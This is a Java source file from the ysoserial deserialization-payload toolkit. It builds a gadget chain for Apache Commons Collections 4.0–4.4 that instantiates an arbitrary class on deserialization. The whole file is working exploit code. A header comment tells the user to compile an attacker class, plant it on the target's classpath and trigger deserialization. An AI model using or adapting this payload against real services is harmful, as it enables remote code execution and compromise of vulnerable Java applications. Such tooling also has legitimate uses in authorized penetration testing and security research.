package ysoserial.payloads;

import org.apache.commons.collections4.Factory;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.FactoryTransformer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.Queue;

/*
 * Work in CC4.0-4.4
 * Chain:
 * Variation on CommonsCollections2 that uses FactoryTransformer instead of InvokerTransformer
 *
 * PriorityQueue.readObject()
 *  .....
 *   TransformingComparator.compare()
 *      FactoryTransformer.transform()
 *          MultiValueMap$ReflectionFactory.create()
 *
 * How to Use?
 * complie com.Runa
 * put com.Runa into target classpath (by write file or so on....), make sure the path is correct
 * Run this payload in DeSerialize to triggle the chain
 */
@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
@Dependencies({"org.apache.commons:commons-collections4:4.1"})
@Authors({ Authors.FROHOFF })
public class CommonsCollections4AnyClassNewinstance implements ObjectPayload<Queue<Object>> {

	public Queue<Object> getObject(final String className) throws Exception {
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
        queue.add(1);
        queue.add(1);

        Class reflectionFactoryClass = Class.forName("org.apache.commons.collections4.map.MultiValueMap$ReflectionFactory");
        Constructor constructor = reflectionFactoryClass.getDeclaredConstructor(Class.class);
        constructor.setAccessible(true);
        Factory reflectionFactory = (Factory) constructor.newInstance(Class.forName(className));

        FactoryTransformer<Object, Object> objectObjectFactoryTransformer = new FactoryTransformer(reflectionFactory);
        Class priorityQueueClass = PriorityQueue.class;
        Field comparator = priorityQueueClass.getDeclaredField("comparator");
        comparator.setAccessible(true);

        TransformingComparator transformingComparator = new TransformingComparator(objectObjectFactoryTransformer);
        comparator.set(queue, transformingComparator);
		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections4AnyClassNewinstance.class, args);
	}
}
